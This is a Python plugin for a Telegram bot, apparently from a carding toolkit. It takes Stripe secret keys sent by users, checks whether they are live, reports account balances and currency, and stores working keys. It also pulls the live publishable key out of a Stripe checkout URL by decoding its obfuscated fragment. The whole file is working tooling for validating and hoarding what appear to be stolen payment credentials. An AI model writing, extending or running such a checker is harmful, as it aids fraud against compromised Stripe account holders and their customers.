import base64
import httpx
import stripe
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from TOOLS.check_all_func import *

stripe.api_key = ""


@Client.on_message(filters.command("pk", [".", "/"]))
async def skTopk(Client, message):
    try:
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return

        role = checkall[1]

        if len(message.text.split()) == 1:
            resp = """<b>
Invalid SK ⚠️

Message: Not Found Any Valid SK From Your Input.
            </b>"""
            await message.reply_text(resp, message.id)
            return

        try:
            sk = str(message.text.split(" ")[1])
        except:
            sk = message.reply_to_message.from_user.id

            resp = """<b>
Invalid SK Key ⚠️

Message: Not Found Valid Sk Key From Your Input.
            </b>"""
            await message.reply_text(resp, message.id)
            return

        try:
            stripe.api_key = sk

            session = httpx.AsyncClient()
            try:
                headers = {
                    "Authorization": f"Bearer {sk}"
                }
                # Fetch SK info
                skinfo_response = await session.get("https://api.stripe.com/v1/account", headers=headers)
                skinfo = skinfo_response.json()

                # Fetch balance info
                balance_response = await session.get("https://api.stripe.com/v1/balance", headers=headers)
                balance_info = balance_response.json()
            except Exception as e:
                await error_log(str(e))





            checkout_url = create_checkout_session()

            pk = await get_stripe_data(checkout_url)




            skinfo = stripe.Account.retrieve()

            charges_enabled = skinfo['charges_enabled']
            card_payment = skinfo['capabilities']['card_payments']

            if "inactive" in card_payment:
                    resp = """<b>
SK Key Expired ⚠️

Message: Your SK key has expired. Please obtain a new SK key.
                    </b>"""
      
                    await message.reply_text(resp, message.id)
                    return

            currency = skinfo['default_currency'].upper()
            livemode = balance_info['livemode']

            available_balance = balance_info.get("available", [{}])[0].get("amount", "N/A")
            pending_balance = balance_info.get("pending", [{}])[0].get("amount", "N/A")

            if charges_enabled:
                await addsk(sk)

        except stripe.error.StripeError as e:
            await error_log(f"Stripe Error: {e}")
            resp = """<b>
Error fetching Sk info ⚠️

Message: Unable to fetch Sk info. Check if the SK is Live.
            </b>"""
            await message.reply_text(resp, message.id)
            return
        except Exception as e:
            await error_log(f"Error: {e}")
            resp = """<b>
Error fetching Sk info ⚠️

Message: Unable to fetch Sk info. Check if the SK is Live.
            </b>"""
            await message.reply_text(resp, message.id)
            return

        PK_KEY = pk
        full_pk ="pk_live_"+pk





        resp = f"""<b>
SK TO PK GENERATED SUCCESSFULLY ✅
━━━━━━━━━━━━━━ 
SK:➺ <code>{sk}</code>

PK:➺ <code>{full_pk}</code>
━━━━━━━━━━━━━━ 

LIVE MODE:➺ <code>{livemode}</code>
CARD PAYMENT:➺ <code>{card_payment}</code>
Currency:➺ <code>{currency}</code>
Available Balance :➺ <code>{available_balance}</code>
Pending Balance :➺ <code>{pending_balance}</code>

━━━━━━━━━━━━━━ 

Checked By <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [ {role} ] 
Bot by - <a href="tg://user?id=6745804180">Toͥnmͣoͫy 〔 Ɠφ 〕</a>
</b>"""
        await message.reply_text(resp, message.id)

    except Exception as e:
        import traceback
        await error_log(traceback.format_exc())


def create_checkout_session():
    try:
        session = stripe.checkout.Session.create(
            payment_method_types=['card'],
            line_items=[
                {
                    'price_data': {
                        'currency': 'usd',
                        'product_data': {
                            'name': 'Awesome Product',
                        },
                        'unit_amount': 100,
                    },
                    'quantity': 1,
                },
            ],
            mode='payment',
            success_url='https://your-website.com/success',
            cancel_url='https://your-website.com/cancel',
        )
        return session.url
    except:
        pass


async def get_stripe_data(checkout_url):
    try:
        url = checkout_url.split('#')[1]
        encoded_url = url.replace('%2B', '+').replace('%2F', '/')
        encoded_url += '=' * (len(encoded_url) % 4)
        decoded_bytes = base64.urlsafe_b64decode(encoded_url)
        decoded_url = decoded_bytes.decode('utf-8')
        key = 5
        binary_key = bin(key)[2:].zfill(8)
        plaintext = ""
        for i in range(len(decoded_url)):
            binary_char = bin(ord(decoded_url[i]))[2:].zfill(8)
            xor_result = ""
            for j in range(8):
                xor_result += str(int(binary_char[j]) ^ int(binary_key[j]))
            plaintext += chr(int(xor_result, 2))
        pk = plaintext.split('pk_live_')[1].split('"')[0]
        return pk
    except:
        pass
